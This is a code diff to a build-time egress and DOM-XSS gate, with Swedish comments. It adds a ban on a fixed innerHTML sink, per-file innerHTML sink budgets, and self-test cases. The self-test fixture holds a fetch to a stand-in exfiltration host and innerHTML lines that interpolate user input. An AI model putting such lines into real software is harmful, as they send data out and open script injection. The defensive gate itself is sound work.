@@ -140,6 +140,52 @@ const REQUIRED_MARKERS = {
     'shared/map-hardat-modal.js': ['checkPrefetched']
 };
 
+// ── DOM-XSS-sänkor ───────────────────────────────────────────────────────────
+// Bakgrund: publiceringsdialogen byggdes med innerHTML och interpolerade
+// STÄLLE-fältet, som AUTOFYLLS från geokodningssvar. Det gav DOM-XSS på fem
+// rapportsidor — och eftersom härdat läge är ett vanligt JS-tillstånd kunde
+// injicerad kod stänga av hela spärren. Två regler skyddar mot återfall:
+//
+//  A. publishInfo får ALDRIG sättas via innerHTML igen (hård spärr).
+//  B. Budget per fil för innerHTML-satser som interpolerar. Ändras antalet
+//     blir bygget rött — inte för att varje sådan sats är farlig (de flesta
+//     interpolerar hårdkodade konstanter), utan för att en NY sänka ska
+//     tvinga fram ett medvetet beslut i stället för att glida in.
+const FORBUDNA_MONSTER = [
+    { re: /publishInfo['"]?\s*\)?\s*\.innerHTML/, text: 'publishInfo sätts via innerHTML — bygg raderna med textContent (DOM-XSS, fixad 2026-07-30)' }
+];
+
+// MÄTT mot koden efter XSS-fixen 2026-07-30 — inte gissat. Filer som saknas
+// här har budget 0. Siffrorna är ett ändringslarm, inte ett godkännande av
+// varje enskild sats: de granskade fallen interpolerar hårdkodade listor
+// (ROLLER, AMMO_TYPES) och interna räknare, aldrig fältvärden.
+const HTML_SINK_BUDGET = {
+    'app6.html': 6,
+    'pedars.html': 4,
+    'fg.html': 3,
+    'forkort.html': 2,
+    'obo.html': 2,
+    'ra763.html': 2,
+    'rassoika.html': 2,
+    'saekr.html': 2,
+    'sigskydd.html': 2,
+    'minkarta.html': 1,
+    'sensorskiss.html': 1
+};
+
+// Räknar innerHTML-satser som interpolerar (template-literal med ${} eller
+// strängkonkatenering med variabel). Multiline — sänkan som missades låg med
+// tilldelningen och strängen på olika rader.
+function raknaHtmlSankor(src) {
+    let n = 0;
+    const re = /\.innerHTML\s*\+?=\s*([\s\S]{0,500}?);/g;
+    let m;
+    while ((m = re.exec(src)) !== null) {
+        if (/\$\{/.test(m[1])) n++;
+    }
+    return n;
+}
+
 // ─────────────────────────────────────────────────────────────────────────────
 
 function servedFiles() {
@@ -190,6 +236,27 @@ function scan(files, readFile) {
         }
     }
 
+    // A. Hårda förbud (regressionsspärrar för åtgärdade sårbarheter).
+    for (const file of files) {
+        const src = readFile(file);
+        for (const f of FORBUDNA_MONSTER) {
+            if (f.re.test(src)) errors.push('FÖRBJUDET MÖNSTER i ' + file + ': ' + f.text);
+        }
+    }
+
+    // B. Budget för innerHTML-sänkor som interpolerar.
+    for (const file of files) {
+        const n = raknaHtmlSankor(readFile(file));
+        const budget = HTML_SINK_BUDGET[file] || 0;
+        if (n > budget) {
+            errors.push('NY innerHTML-SÄNKA i ' + file + ': ' + n + ' interpolerande innerHTML-satser, budget ' + budget +
+                '. Interpolerar den användarindata? Bygg då med textContent. Är den konstant-driven: höj budgeten i verktyg/egress-gate.js.');
+        } else if (n < budget) {
+            errors.push('BUDGET FÖR HÖG för ' + file + ': ' + n + ' sänkor kvar men budget ' + budget +
+                '. Sänk budgeten så den fortsätter fånga nya sänkor.');
+        }
+    }
+
     for (const [file, markers] of Object.entries(REQUIRED_MARKERS)) {
         if (!files.includes(file)) {
             errors.push('SAKNAD FIL: ' + file + ' (krävs av REQUIRED_MARKERS — har den bytt namn? Uppdatera gaten medvetet).');
@@ -207,22 +274,35 @@ function scan(files, readFile) {
 }
 
 function selftest() {
-    // Gaten ska larma på: okänd host, fetch-host i oregistrerad fil, raderad markör.
+    // Gaten ska larma på fem felklasser: okänd host, fetch-host i oregistrerad
+    // fil, raderad gate-markör, återinförd publishInfo-innerHTML och ny
+    // interpolerande innerHTML-sänka.
     const fakeFiles = ['index.html', 'evil-ny-fil.js'].concat(Object.keys(REQUIRED_MARKERS));
     const real = f => { try { return fs.readFileSync(path.join(ROOT, f), 'utf8'); } catch (_) { return ''; } };
     const fakeRead = f => {
-        if (f === 'evil-ny-fil.js') return 'fetch("https://exfil.example.com/x"); const t = "https://tile.opentopomap.org/1/2/3.png";';
+        if (f === 'evil-ny-fil.js') {
+            return 'fetch("https://exfil.example.com/x");\n' +
+                   'const t = "https://tile.opentopomap.org/1/2/3.png";\n' +
+                   'el.innerHTML = `<b>${anvandarInput}</b>`;\n' +
+                   "document.getElementById('publishInfo').innerHTML = `x${y}`;";
+        }
         if (f === 'index.html') return real(f).replace(/stripExif/g, 'borttagen');
         return real(f);
     };
     const errs = scan(fakeFiles, fakeRead);
-    const expect = [
-        errs.some(e => e.includes('exfil.example.com')),
-        errs.some(e => e.includes('tile.opentopomap.org') && e.includes('evil-ny-fil.js')),
-        errs.some(e => e.includes('stripExif'))
-    ];
-    if (expect.every(Boolean)) { console.log('Självtest OK — gaten larmar på alla tre felklasserna.'); return 0; }
-    console.error('SJÄLVTEST MISSLYCKADES — gaten larmar inte som den ska:', expect);
+    const krav = {
+        'ny extern host': errs.some(e => e.includes('exfil.example.com')),
+        'fetch-host i ny fil': errs.some(e => e.includes('tile.opentopomap.org') && e.includes('evil-ny-fil.js')),
+        'raderad gate-markör': errs.some(e => e.includes('stripExif')),
+        'publishInfo-innerHTML': errs.some(e => e.includes('FÖRBJUDET MÖNSTER')),
+        'ny innerHTML-sänka': errs.some(e => e.includes('NY innerHTML-SÄNKA'))
+    };
+    const misslyckade = Object.keys(krav).filter(k => !krav[k]);
+    if (misslyckade.length === 0) {
+        console.log('Självtest OK — gaten larmar på alla ' + Object.keys(krav).length + ' felklasserna.');
+        return 0;
+    }
+    console.error('SJÄLVTEST MISSLYCKADES — dessa larm uteblev: ' + misslyckade.join(', '));
     return 1;
 }
 
